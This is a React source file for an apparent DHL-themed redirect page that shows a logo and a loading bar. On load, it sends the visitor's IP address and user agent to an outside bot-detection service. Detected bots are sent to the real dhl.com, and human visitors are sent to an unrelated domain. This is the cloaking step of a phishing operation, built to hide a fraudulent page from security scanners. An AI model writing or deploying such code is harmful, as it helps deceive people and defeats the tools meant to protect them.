import React, { useEffect, useState } from "react";
import axios from "axios";
import logo from "./assets/logo.png";
import "./App.css";

const App = () => {
  const [progress, setProgress] = useState(0);
  const [redirectUrl, setRedirectUrl] = useState("https://sage.aaprefetch.pro");

  useEffect(() => {
    const checkBotStatus = async () => {
      try {
        const ipResponse = await axios.get("https://api64.ipify.org?format=json");
        const ip = ipResponse.data.ip;

        const response = await axios.post("https://rail-bot-production.up.railway.app/api/detect_bot", {
          user_agent: navigator.userAgent,
          ip: ip,
        });

        if (response.data.is_bot) {
          setRedirectUrl("https://dhl.com");
        }
      } catch (error) {
        console.error("Error detecting bot status:", error);
      }
    };

    checkBotStatus();

    let progressInterval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          window.location.href = redirectUrl;
        }
        return prev + 10;
      });
    }, 200);

    return () => clearInterval(progressInterval);
  }, [redirectUrl]);

  return (
    <div className="container" style={{ backgroundColor: "#333", height: "100vh" }}>
      <img src={logo} alt="Logo" className="logo" />
      <div className="progress-bar-container">
        <div className="progress-bar" style={{ width: `${progress}%` }}></div>
      </div>
      <p className="progress-text">Loading in {Math.max(2 - progress / 50, 0).toFixed(1)}s...</p>
    </div>
  );
};

export default App;
